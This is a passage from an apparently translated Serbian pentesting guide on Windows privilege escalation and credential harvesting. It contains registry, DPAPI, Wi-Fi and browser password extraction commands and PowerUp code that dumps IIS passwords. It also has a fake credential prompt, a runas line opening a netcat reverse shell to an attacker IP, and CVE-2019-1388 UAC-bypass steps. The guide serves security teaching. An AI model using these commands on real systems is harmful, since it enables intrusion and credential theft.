Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Pravila Firewalla

[**Proverite ovu stranicu za komande vezane za Firewall**](../basic-cmd-for-pentesters.md#firewall) **(prikaži pravila, kreiraj pravila, isključi, isključi...)**

Više[ komandi za enumeraciju mreže ovde](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binary `bash.exe` se takođe može naći u `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Ako dobijete root user, možete slušati na bilo kojem portu (prvi put kada koristite `nc.exe` da slušate na portu, pitaće preko GUI da li `nc` treba da bude dozvoljen od strane firewall-a).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Da biste lako pokrenuli bash kao root, možete pokušati `--default-user root`

Možete istražiti `WSL` fajl sistem u fascikli `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Windows kredencijali

### Winlogon kredencijali
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Menadžer kredencijala / Windows Vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault čuva korisničke kredencijale za servere, web sajtove i druge programe za koje **Windows** može **automatski ulogovati korisnike**. Na prvi pogled, može izgledati da korisnici mogu čuvati svoje Facebook credentials, Twitter credentials, Gmail credentials itd., kako bi se automatski prijavljivali preko browsers. Ali to nije tako.

Windows Vault čuva kredencijale koje Windows može iskoristiti za automatsku prijavu korisnika, što znači da svaka **Windows application that needs credentials to access a resource** (server ili web sajt) **can make use of this Credential Manager** i Windows Vault i iskoristiti sačuvane kredencijale umesto da korisnici stalno unose username i password.

Ako aplikacije ne interaguju sa Credential Manager-om, mislim da im nije moguće koristiti kredencijale za određeni resurs. Dakle, ako vaša aplikacija želi da koristi vault, treba na neki način **communicate with the credential manager and request the credentials for that resource** iz podrazumevanog vault-a za skladištenje.

Koristite `cmdkey` da izlistate sačuvane kredencijale na mašini.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Zatim možete koristiti `runas` sa opcijom `/savecred` kako biste koristili saved credentials. Sledeći primer poziva remote binary putem SMB share.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Korišćenje `runas` sa prosleđenim kredencijalima.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Napomena da mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), or from [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

The **Data Protection API (DPAPI)** pruža metodu za simetričnu enkripciju podataka, prvenstveno korišćenu u Windows operativnom sistemu za simetričnu enkripciju asimetričnih privatnih ključeva. Ova enkripcija koristi korisničku ili sistemsku tajnu koja značajno doprinosi entropiji.

**DPAPI omogućava enkripciju ključeva putem simetričnog ključa koji je izveden iz korisničkih login tajni**. U scenarijima koji uključuju sistemsku enkripciju, koristi sistemske domenske autentifikacione tajne.

Encrypted user RSA keys, by using DPAPI, are stored in the `%APPDATA%\Microsoft\Protect\{SID}` directory, where `{SID}` represents the user's [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier). **DPAPI ključ, koji se nalazi zajedno sa master ključem koji štiti korisnikove privatne ključeve u istom fajlu**, obično se sastoji od 64 bajta slučajnih podataka. (Važno je napomenuti da je pristup ovom direktorijumu ograničen, što sprečava listanje njegovog sadržaja putem komande `dir` u CMD, mada se može listati kroz PowerShell).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Možete koristiti **mimikatz module** `dpapi::masterkey` sa odgovarajućim argumentima (`/pvk` ili `/rpc`) da ga dešifrujete.

Fajlovi **credentials files protected by the master password** se obično nalaze u:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Možete koristiti **mimikatz module** `dpapi::cred` sa odgovarajućim `/masterkey` da dešifrujete.\
Možete izvući mnoge **DPAPI masterkeys** iz memorije pomoću modula `sekurlsa::dpapi` (ako imate root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell kredencijali

**PowerShell credentials** se često koriste za **scripting** i zadatke automatizacije kao praktičan način za čuvanje enkriptovanih kredencijala. Kredencijali su zaštićeni pomoću **DPAPI**, što obično znači da ih može dešifrovati samo isti korisnik na istom računaru na kojem su kreirani.

Da biste **decrypt** PS credentials iz fajla koji ih sadrži, možete uraditi:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Sačuvane RDP Connections

Možete ih naći na `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
i u `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Nedavno pokrenute komande
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Upravljač kredencijalima za Udaljenu radnu površinu**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files**\
You can **extract many DPAPI masterkeys** from memory with the Mimikatz `sekurlsa::dpapi` module

### Sticky Notes

Ljudi često koriste StickyNotes aplikaciju na Windows radnim stanicama da **sačuvaju lozinke** i druge informacije, ne shvatajući da je u pitanju baza podataka. Ovaj fajl se nalazi na `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` i uvek vredi pretražiti i pregledati.

### AppCmd.exe

**Note that to recover passwords from AppCmd.exe you need to be Administrator and run under a High Integrity level.**\
**AppCmd.exe** is located in the `%systemroot%\system32\inetsrv\` directory.\
If this file exists then it is possible that some **credentials** have been configured and can be **recovered**.

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Proveri da li `C:\Windows\CCM\SCClient.exe` postoji .\
Instalateri se pokreću sa **SYSTEM privilegijama**, mnogi su ranjivi na **DLL Sideloading (Informacije sa** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Datoteke i Registar (Kredencijali)

### Putty kredencijali
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH host ključevi
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys u registru

Moguće je da su SSH private keys pohranjeni unutar registrskog ključa `HKCU\Software\OpenSSH\Agent\Keys`, pa proverite ima li tamo nešto interesantno:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Ako pronađete bilo koji unos u toj putanji, verovatno je to sačuvan SSH ključ. Čuvan je šifrovano, ali se lako može dešifrovati korišćenjem [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Više informacija o ovoj tehnici ovde: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Ako `ssh-agent` servis nije pokrenut i želite da se automatski pokreće pri podizanju sistema, pokrenite:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Izgleda da ova tehnika više nije validna. Pokušao sam da napravim neke ssh keys, dodam ih pomoću `ssh-add` i ulogujem se preko ssh na mašinu. Registar HKCU\Software\OpenSSH\Agent\Keys ne postoji i procmon nije identifikovao upotrebu `dpapi.dll` tokom asymmetric key authentication.

### Datoteke bez nadzora
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Takođe možete pretražiti ove datoteke koristeći **metasploit**: _post/windows/gather/enum_unattend_

Primer sadržaja:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM rezervne kopije
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Kredencijali za cloud
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Potražite fajl pod nazivom **SiteList.xml**

### Keširana GPP lozinka

Pre bilo je dostupno svojstvo koje je omogućavalo raspoređivanje prilagođenih lokalnih administrator naloga na grupu računara putem Group Policy Preferences (GPP). Međutim, ova metoda je imala značajne bezbednosne propuste. Prvo, Group Policy Objects (GPOs), koje su sačuvane kao XML fajlovi u SYSVOL, mogle su biti pristupljene od strane bilo kog korisnika domena. Drugo, lozinke unutar ovih GPP-ova, enkriptovane AES256 koristeći javno dokumentovani podrazumevani ključ, mogle su biti dekriptovane od strane bilo kog autentifikovanog korisnika. To je predstavljalo ozbiljan rizik, jer je omogućavalo korisnicima sticanje povišenih privilegija.

Da bi se ublažio ovaj rizik, razvijena je funkcija koja skenira lokalno keširane GPP fajlove koji sadrže polje "cpassword" koje nije prazno. Prilikom pronalaska takvog fajla, funkcija dekriptuje lozinku i vraća prilagođeni PowerShell objekat. Ovaj objekat sadrži detalje o GPP i lokaciji fajla, što pomaže u identifikaciji i otklanjanju ove bezbednosne ranjivosti.

Potražite u `C:\ProgramData\Microsoft\Group Policy\history` ili u _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (pre Windows Viste)_ sledeće fajlove:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Da biste dekriptovali cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Korišćenje crackmapexec za dobijanje passwords:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web konfiguracija
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Primer web.config sa kredencijalima:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN credentials
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Logovi
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Zatražite credentials

Uvek možete **zamoliti korisnika da unese svoje credentials ili čak credentials drugog korisnika** ako mislite da ih može znati (imajte na umu da je **pitati** klijenta direktno za **credentials** zaista **rizično**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Mogući nazivi fajlova koji sadrže credentials**

Poznati fajlovi koji su pre nekog vremena sadržavali **passwords** u **clear-text** ili **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Pretraži sve predložene datoteke:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Credentials u RecycleBin

Takođe proveri Bin da potražiš credentials u njemu

Za **oporavak lozinki** koje su sačuvane u nekoliko programa možeš koristiti: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Unutar registry

**Drugi mogući registry keys sa credentials**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Istorija pregledača

Proverite baze podataka (dbs) gde su sačuvane lozinke iz **Chrome or Firefox**.\
Takođe proverite istoriju, obeleživače i favorite pregledača — možda su tamo sačuvane neke **lozinke**.

Alati za izvlačenje lozinki iz pregledača:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** je tehnologija ugrađena u Windows operativni sistem koja omogućava međusobnu komunikaciju između softverskih komponenti napisanih u različitim jezicima. Svaka COM komponenta je **identifikovana putem class ID (CLSID)** i svaka komponenta izlaže funkcionalnost preko jedne ili više interfejsa, identifikovanih putem interface ID (IIDs).

COM klase i interfejsi su definisani u registru pod **HKEY\CLASSES\ROOT\CLSID** i **HKEY\CLASSES\ROOT\Interface** respektivno. Ovaj registar se kreira spajanjem **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Unutar CLSID-ova u ovom registru možete naći child ključ **InProcServer32** koji sadrži **podrazumevanu vrednost** koja pokazuje na **DLL** i vrednost nazvanu **ThreadingModel** koja može biti **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) ili **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

U suštini, ako možete **prepisati bilo koji od DLL-ova** koji će biti izvršeni, možete **eskalirati privilegije** ako će taj DLL biti izvršen od strane drugog korisnika.

Da biste saznali kako napadači koriste COM Hijacking kao mehanizam perzistencije, proverite:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generičko pretraživanje lozinki u fajlovima i registru**

**Pretraži sadržaj fajlova**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Pretraži datoteku sa određenim imenom**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Pretražite registar za nazive ključeva i lozinke**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Alati koji pretražuju passwords

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **je msf** plugin koji sam napravio da **automatski izvršava svaki metasploit POST module koji pretražuje credentials** unutar žrtve.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) automatski pretražuje sve fajlove koji sadrže passwords pomenute na ovoj stranici.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) je još jedan odličan alat za izvlačenje password iz sistema.

Alat [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) traži **sessions**, **usernames** i **passwords** nekoliko alata koji čuvaju ove podatke u čistom tekstu (PuTTY, WinSCP, FileZilla, SuperPuTTY i RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Zamislite da **a process running as SYSTEM open a new process** (`OpenProcess()`) sa **full access**. Isti proces **also create a new process** (`CreateProcess()`) **with low privileges but inheriting all the open handles of the main process**.\
Ako imate **full access to the low privileged process**, možete dohvatiti **open handle to the privileged process created** pomoću `OpenProcess()` i **inject a shellcode**.\
[Pročitajte ovaj primer za više informacija o tome **kako detektovati i iskoristiti ovu ranjivost**.](leaked-handle-exploitation.md)\
[Pročitajte ovaj **drugi post za potpunije objašnjenje kako testirati i zloupotrebiti više open handlers procesa i thread-ova nasleđenih sa različitim nivoima dozvola (ne samo full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Segmenti deljene memorije, poznati kao **pipes**, omogućavaju komunikaciju procesa i prenos podataka.

Windows pruža funkcionalnost zvanu **Named Pipes**, koja omogućava nepovezanim procesima da dele podatke, čak i preko različitih mreža. Ovo podseća na client/server arhitekturu, sa ulogama definisanim kao **named pipe server** i **named pipe client**.

Kada podaci budu poslati kroz pipe od strane **client**, **server** koji je postavio pipe ima mogućnost da **preuzme identitet** **client-a**, pod uslovom da ima neophodna prava **SeImpersonate**. Pronalazak **privileged process** koji komunicira putem pipe-a koji možete imitirati daje priliku da **gain higher privileges** preuzimanjem identiteta tog procesa kada on interaguje sa pipe-om koji ste uspostavili. Za uputstva kako izvesti takav napad, korisni vodiči se nalaze [**ovde**](named-pipe-client-impersonation.md) i [**ovde**](#from-high-integrity-to-system).

Takođe, sledeći alat omogućava da **intercept a named pipe communication with a tool like burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **i ovaj alat omogućava listanje i pregled svih pipe-ova da biste našli privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Misc

### File Extensions that could execute stuff in Windows

Pogledajte stranicu **[https://filesec.io/](https://filesec.io/)**

### **Monitoring Command Lines for passwords**

Kada dobijete shell kao korisnik, mogu postojati zakazani zadaci ili drugi procesi koji se izvršavaju i koji **pass credentials on the command line**. Skripta ispod beleži process command lines svakih dve sekunde i upoređuje trenutno stanje sa prethodnim, ispisujući sve razlike.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Krađa lozinki iz procesa

## Od korisnika sa niskim privilegijama do NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Ako imate pristup grafičkom interfejsu (preko console ili RDP) i UAC je omogućen, u nekim verzijama Microsoft Windows moguće je pokrenuti terminal ili bilo koji drugi proces kao "NT\AUTHORITY SYSTEM" iz naloga koji nije privilegovan.

Ovo omogućava eskalaciju privilegija i zaobilaženje UAC-a istovremeno koristeći istu ranjivost. Dodatno, nema potrebe za instalacijom bilo čega, a binarni fajl koji se koristi tokom procesa je potpisan i izdat od strane Microsofta.

Neki od pogođenih sistema su sledeći:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Da biste iskoristili ovu ranjivost, potrebno je izvršiti sledeće korake:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## Od Administrator Medium do High Integrity Level / UAC Bypass

Pročitajte ovo da **saznate o Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Zatim **pročitajte ovo da naučite o UAC i UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Od Arbitrary Folder Delete/Move/Rename do SYSTEM EoP

